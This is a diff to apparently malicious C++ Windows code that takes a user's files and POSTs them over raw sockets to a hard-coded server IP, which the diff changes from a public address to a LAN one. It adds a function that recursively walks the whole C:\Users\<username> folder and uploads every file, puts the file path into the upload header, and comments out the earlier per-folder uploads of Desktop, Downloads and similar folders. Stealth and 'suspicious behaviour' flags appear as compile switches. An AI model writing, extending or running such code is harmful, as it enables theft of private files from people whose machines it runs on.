@@ -16,10 +16,10 @@
 namespace fs = std::filesystem;
 
 #define susBehaviour false
-#define stealthBehaviour true
+#define stealthBehaviour false
 
 #define SERV_PORT 8080 // The port the HTTP POST request will be sent to
-const char szHost[] = "20.117.90.95"; // The IP address of the server
+const char szHost[] = "192.168.1.139"; // The IP address of the server
 
 /* 
 	returns a connected socket at the given address and port
@@ -89,13 +89,13 @@ void sendFile(std::string path, std::string fileName){
 		POST / HTTP/1.1
 		Host:[HOSTNAME]
 		Content-Type: application/octet-stream
-		Content-Disposition: attachment; filename=[FILENAME]
+		Content-Disposition: attachment; path=[PATH]; filename=[FILENAME]
 
 		[DATA]
 	*/
 	std::string request = "POST / HTTP/1.1\r\n";
 	request += "Host: " + std::string(szHost) + ":" + std::to_string(SERV_PORT) + "\r\n";
-	request += "Content-Type: application/octet-stream\r\nContent-Disposition: attachment; filename=" + fileName + "\r\n\r\n";
+	request += "Content-Type: application/octet-stream\r\nContent-Disposition: attachment; path=" + path + "; filename=" + fileName + "\r\n\r\n";
 	
 	long unsigned int requestSize = data.size() + request.size();
 	std::vector<char> requestBuffer;
@@ -128,7 +128,6 @@ void sendFile(std::string path, std::string fileName){
 	closesocket(s);
 	WSACleanup();
 	in.close();
-	
 }
 
 
@@ -148,6 +147,16 @@ void uploadFilesInFolder(fs::path p) {
 #endif
 			sendFile(entry.path().string(), username + "_" + entry.path().filename().string());
 			Sleep(1000);
+		}
+	}
+}
+
+void uploadFilesInFolderRecursive(fs::path p) {
+	for (const auto& entry : fs::recursive_directory_iterator(p)) {
+		// Check if entry is a file or a folder
+		if (!entry.is_directory()) {
+			sendFile(entry.path().string(), entry.path().filename().string());
+			Sleep(100);
 		}
 	}
 }
@@ -188,7 +197,7 @@ int main() {
 	printf("%s | %s\n", szStartupExecPath, szExecPath);
 	#endif
 #endif // susBehaviour
-
+	/*
 	fs::path desktopPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Desktop");
 	fs::path downloadsPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Downloads");
 	fs::path picturesPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Pictures");
@@ -204,6 +213,9 @@ int main() {
 	uploadFilesInFolder(videosPath);
 	uploadFilesInFolder(musicPath);
 	uploadFilesInFolder(favouritesPath);
+	*/
+	fs::path userPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME"));
+	uploadFilesInFolderRecursive(userPath);
 	// Done!
 	ExitProcess(EXIT_SUCCESS);
 }
